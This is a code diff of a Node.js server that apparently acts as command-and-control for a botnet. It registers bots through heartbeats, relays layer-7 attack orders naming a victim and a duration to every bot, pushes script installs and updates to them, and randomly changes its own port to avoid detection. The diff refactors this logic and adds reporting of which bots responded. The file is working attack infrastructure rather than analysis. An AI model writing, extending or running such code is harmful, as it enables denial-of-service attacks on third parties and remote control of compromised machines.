@@ -38,6 +38,7 @@ let SERVICENAME = null
 let SCRIPTS = null
 let CURRENTPORT = null
 let activeMachines = []
+let GLOBALS = {}
 const dbok = new EventEmitter()
 
 function logID() {
@@ -183,8 +184,8 @@ app.get('/setup', (req, res) => {
                         var regex = new RegExp("SERVICENAME", "g");
                         requested = requested.replace(regex, SERVICENAME)
                         //res.send(200, (requested))
-                    } 
-                } 
+                    }
+                }
             })
             .catch(err => {
                 if (scid === "script_json") {
@@ -209,7 +210,7 @@ app.get('/setup', (req, res) => {
                 }
                 else {
                     console.log(err);
-                    res.send(500, {error: {message: err.message}})
+                    res.send(500, { error: { message: err.message } })
                 }
             })
     }
@@ -228,7 +229,7 @@ app.get('/', (req, res) => {
 })
 
 app.get('/heartbeat', (req, res) => {
-    if (!activeMachines.includes(req.headers['x-forwarded-for'] || req.connection.remoteAddress)){
+    if (!activeMachines.includes(req.headers['x-forwarded-for'] || req.connection.remoteAddress)) {
         activeMachines.push(req.headers['x-forwarded-for'] || req.connection.remoteAddress)
     }
     res.send(200, "OKAY")
@@ -239,61 +240,58 @@ app.get('/all/installscript/:scriptid', (req, res) => {
     for (let index = 0; index < clen; index++) {
         console.log(`Asking ${activeMachines[index]}:${CURRENTPORT}`);
         axios.get(`http://${activeMachines[index]}:${CURRENTPORT}/installScript/${req.params.scriptid}`)
-        .then(res => {
-            console.log(res.data)
-        })
-        .catch(err => {
-            console.error(err); 
-        })
-        
+            .then(res => {
+                console.log(res.data)
+            })
+            .catch(err => {
+                console.error(err);
+            })
+
     }
     res.send(200, "OKAY")
 })
 
-app.get('/all/attacklayer7/:methodID/:victim/:time/:attackID', (req, res) => {
+app.get('/all/attacklayer7/:methodID/:victim/:time/:attackID', async (req, res) => {
     clen = activeMachines.length
+    let machines = {
+        all: activeMachines,
+        asked: [],
+        responded: [],
+        busy: []
+    }
     for (let index = 0; index < clen; index++) {
+        machines.asked.push(activeMachines[index])
         console.log(`http://${activeMachines[index]}:${CURRENTPORT}/layer7/${req.params.methodID}/${req.params.victim}/${req.params.time}/${req.params.attackID}`);
         axios.get(`http://${activeMachines[index]}:${CURRENTPORT}/layer7/${req.params.methodID}/${req.params.victim}/${req.params.time}/${req.params.attackID}`)
-        .then(res => {
-            console.log(res.data)
-        })
-        .catch(err => {
-            console.error(err); 
-        })
-        
+            .then(res => {
+                console.log(res.data)
+                machines.responded.push(activeMachines[index])
+            })
+            .catch(err => {
+                console.error(err.response.data);
+                machines.busy.push(activeMachines[index])
+            })
     }
-    res.send(200, "OKAY")
+    await delay(3000)
+    res.send(200, { asked: machines.asked.length, responded: machines.responded.length, busy: machines.responded.busy, data: machines })
 })
 app.get('/all/update', (req, res) => {
     clen = activeMachines.length
     for (let index = 0; index < clen; index++) {
         console.log(`http://${activeMachines[index]}:${CURRENTPORT}/update`);
         axios.get(`http://${activeMachines[index]}:${CURRENTPORT}/update`)
-        .then(res => {
-            console.log(res.data)
-        })
-        .catch(err => {
-            console.error(err.response); 
-        })
-        
+            .then(res => {
+                console.log(res.data)
+            })
+            .catch(err => {
+                console.error(err.response.data);
+            })
+
     }
     res.send(200, "OKAY")
 })
 app.get('/globals', (req, res) => {
-    axios.get("http://localhost:3000/global")
-    .then(resp => {
-        res.send(resp.data)
-    })
-    .catch(err => {
-        console.error(err);
-        res.send(500, {
-            error: {
-                message: "FAILED_FETCH",
-                innerResponse: `${err.message}`
-            }
-        })
-    })
+    res.send(200, GLOBALS)
 })
 
 app.post('/mgmt/changePort/:newPort', async (req, res) => {
@@ -332,21 +330,15 @@ app.post('/mgmt/schedulePortChange/:newPort/:inMins', async (req, res) => {
 
 app.post('/mgmt/portElusion/', async (req, res) => {
     let newPort = await randomInt(1000, 9999)
-    axios.get("http://localhost:3000/global")
-    .then(res => {
-            let global = res.data
-            global.port.changeAt = moment().add({ seconds: 6 }).unix() * 1000,
-            global.port.changeTo = newPort
-            global.port.changedLast = Date.now()
-            axios.patch("http://localhost:3000/global", global)
-            .then(res => {
-                    //console.log(res)
-                })
-                .catch(err => {
-                    dbok.emit('false')
-                })
+    GLOBALS.port.changeAt = moment().add({ seconds: 6 }).unix() * 1000,
+        GLOBALS.port.changeTo = newPort
+    GLOBALS.port.changedLast = Date.now()
+    axios.patch("http://localhost:3000/global", GLOBALS)
+        .then(res => {
+            //console.log(res)
         })
         .catch(err => {
+            dbok.emit('false')
         })
     res.send(200)
 })
@@ -358,7 +350,7 @@ function initiate() {
         .then(res => {
             AGENTLINK = res.data.agentLink
             SERVICELINK = res.data.serviceLink,
-            SERVICENAME = res.data.serviceName
+                SERVICENAME = res.data.serviceName
 
         })
         .catch(err => {
@@ -385,25 +377,17 @@ function initiate() {
 }
 
 async function changePort(newport, logid) {
-    axios.get("http://localhost:3000/global")
+    logger.info(logid, "Changing port.", "Response for the current settings recieved.")
+    GLOBALS.port.number = parseInt(newport)
+    CURRENTPORT = parseInt(newport)
+    axios.patch("http://localhost:3000/global", GLOBALS)
         .then(res => {
-            logger.info(logid, "Changing port.", "Response for the current settings recieved.")
-            let global = res.data
-            global.port.number = parseInt(newport)
-            CURRENTPORT = parseInt(newport)
-            axios.patch("http://localhost:3000/global", global)
-            .then(res => {
-                logger.info(logid, "Changed port.", `Successfuly switched to port ${res.data.port.number}.`)
-                //console.log(res)
-            })
-            .catch(err => {
-                logger.error(logid, "Couldn't change port. Patch failed.", `${err.message}`)
-                dbok.emit('false')
-            })
+            logger.info(logid, "Changed port.", `Successfuly switched to port ${res.data.port.number}.`)
+            //console.log(res)
         })
         .catch(err => {
-            console.error(err);
-            logger.error(logid, "Couldn't change port. Getting current settings failed.", `${err.message}`)
+            logger.error(logid, "Couldn't change port. Patch failed.", `${err.message}`)
+            dbok.emit('false')
         })
 }
 
@@ -411,25 +395,17 @@ async function schedulePortChange(mins, np, logid) {
     let inMinutes = mins || config.defaultPortReplenishTimeMin
     let newPort = np || await randomInt(1000, 9999)
     logger.info(logid, "Port change schedule requested.", `Scheduling change to port ${newPort} in ${inMinutes} minutes.`)
-    axios.get("http://localhost:3000/global")
-    .then(res => {
-            logger.info(logid, "Port change schedule request.", ` Response for the current settings recieved.`)
-            let global = res.data
-            global.port.changeAt = moment().add({ minutes: inMinutes }).unix() * 1000,
-            global.port.changeTo = newPort
-            global.port.changedLast = Date.now()
-            axios.patch("http://localhost:3000/global", global)
-            .then(res => {
-                    logger.info(logid, "Port change schedule request.", `Successfuly scheduled to port ${newPort} in ${inMinutes} minutes..`)
-                    //console.log(res)
-                })
-                .catch(err => {
-                    logger.error(logid, "Port change schedule failed.", `${err.message}`)
-                    dbok.emit('false')
-                })
+    GLOBALS.port.changeAt = moment().add({ minutes: inMinutes }).unix() * 1000,
+    GLOBALS.port.changeTo = newPort
+    GLOBALS.port.changedLast = Date.now()
+    axios.patch("http://localhost:3000/global", GLOBALS)
+        .then(res => {
+            logger.info(logid, "Port change schedule request.", `Successfuly scheduled to port ${newPort} in ${inMinutes} minutes..`)
+            //console.log(res)
         })
         .catch(err => {
             logger.error(logid, "Port change schedule failed.", `${err.message}`)
+            dbok.emit('false')
         })
 
 }
@@ -443,18 +419,18 @@ async function clock() {
     }
 }
 
-function checkSelf(){
+function checkSelf() {
     axios.get("http://localhost:3000/global")
-    .then(res => {
+        .then(res => {
             let global = res.data
-            if (global.port.changeAt < Date.now()){
+            if (global.port.changeAt < Date.now()) {
                 schedulePortChange()
                 global.port.last = global.port.number
                 global.port.number = global.port.changeTo
                 CURRENTPORT = global.port.changeTo
                 global.port.changedLast = Date.now()
                 axios.patch("http://localhost:3000/global", global)
-                .then(res => {
+                    .then(res => {
                         console.log("repl");
                     })
                     .catch(err => {
@@ -469,8 +445,25 @@ function checkSelf(){
 
 checkSelf();
 
-setInterval(function(){
+setInterval(function () {
     checkSelf()
     console.log(activeMachines);
     console.log(Date.now())
-}, 4000)
+}, 10000)
+setInterval(function () {
+    refreshGlobals()
+}, 5000)
+function refreshGlobals() {
+    axios.get("http://localhost:3000/global")
+        .then(res => {
+            GLOBALS = res.data
+        })
+        .catch(err => {
+            GLOBALS = GLOBALS
+        })
+}
+
+
+setInterval(function () {
+    activeMachines = []
+}, 60000)
